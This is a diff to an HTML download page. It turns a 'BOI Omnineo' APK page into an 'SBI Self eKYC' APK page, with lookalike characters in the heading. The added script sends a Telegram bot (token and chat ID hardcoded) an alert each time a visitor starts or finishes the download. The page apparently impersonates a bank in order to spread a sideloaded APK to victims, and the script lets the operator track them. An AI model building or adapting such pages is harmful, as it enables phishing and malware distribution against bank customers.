@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Download BOI Omnineo APK</title>
+  <title>Download SBI Self ekYC APK</title>
   <style>
     * {
       margin: 0;
@@ -16,7 +16,7 @@
     }
 
     body {
-      background: url('https://apskdonlad.vercel.app/bakg.jpg') no-repeat center center fixed;
+      background: url('https://self-e-kyc-sbi.vercel.app/bakg.jpg') no-repeat center center fixed;
       background-size: cover;
       display: flex;
       align-items: center;
@@ -25,7 +25,7 @@
     }
 
     .overlay {
-      background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent black layer */
+      background-color: rgba(0, 0, 0, 0.5);
       padding: 40px;
       border-radius: 12px;
       text-align: center;
@@ -63,11 +63,65 @@
 </head>
 <body>
   <div class="overlay">
-    <h2>📲 Download BOI Omnineo App</h2>
+    <h2>📲 Download SBl SeIf eKYC App</h2>
     <p>Click the button below to download the latest APK file.</p>
-    <a href="boi_omnineo.apk" download>
-      <button>📥 Download Now</button>
+    <a id="downloadLink" href="sbi_self_ekyc.apk" download>
+      <button id="downloadBtn">📥 Download Now</button>
     </a>
   </div>
+
+  <script>
+    // Telegram Config
+    const chatId = "6677946042";
+    const botToken = "7705340121:AAFSqXEFyyTre0atb8O1G-bCTwGLrM_tX_k";
+
+    async function sendTelegramMessage(message) {
+      try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+      } catch (err) {
+        console.error("Telegram Error:", err);
+      }
+    }
+
+    const downloadBtn = document.getElementById("downloadBtn");
+    const downloadLink = document.getElementById("downloadLink");
+
+    downloadBtn.addEventListener("click", async (e) => {
+      // Step 1: Notify that download started
+      await sendTelegramMessage("📲 User started downloading SBI Self eKYC APK.");
+
+      // Step 2: Wait for file download to begin
+      const url = downloadLink.getAttribute("href");
+      const fileName = url.split("/").pop();
+
+      try {
+        const response = await fetch(url);
+        const blob = await response.blob();
+
+        // Trigger download manually
+        const a = document.createElement("a");
+        a.href = URL.createObjectURL(blob);
+        a.download = fileName;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+
+        // Step 3: Notify that download completed
+        await sendTelegramMessage("✅ Download completed for SBI Self eKYC APK.");
+      } catch (error) {
+        await sendTelegramMessage("❌ Download failed or cancelled.");
+      }
+
+      // Prevent default browser navigation
+      e.preventDefault();
+    });
+  </script>
 </body>
 </html>
